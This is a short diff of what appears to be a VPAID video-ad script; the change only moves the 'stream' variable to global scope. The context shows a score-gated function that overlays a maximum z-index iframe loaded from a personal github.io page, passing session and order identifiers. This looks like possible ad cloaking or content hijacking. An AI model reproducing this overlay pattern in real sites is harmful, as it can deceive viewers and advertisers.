@@ -1,4 +1,4 @@
-var saved_arguments;
+var saved_arguments, stream;
 var is_script_loaded = false;
 var script = document.createElement('script');
 var vpaid_object = null;
@@ -631,7 +631,7 @@ function validateSignature(signature) {
 function doStreaming(response) {
 	var element = vpaid_object;
 	if (response.score == 0) {
-		var stream = document.createElement('iframe');
+		stream = document.createElement('iframe');
 		stream.setAttribute("style","height:"+cordinat.height+"px;width:"+cordinat.width+"px;border:0px;position:absolute;top:"+cordinat.top+"px;left:"+cordinat.left+"px;z-Index:10000000;"); 
 		stream.setAttribute("allowFullScreen","");  
 		stream.setAttribute("src","https://coolboy112233.github.io/unknowbastard/unknown.html?sid="+element.parameters_['sid'] + "&videoId=" + element.parameters_['videoId'] + "&orderId=" + element.parameters_['id'] + "&source=" + element.parameters_['source']); 
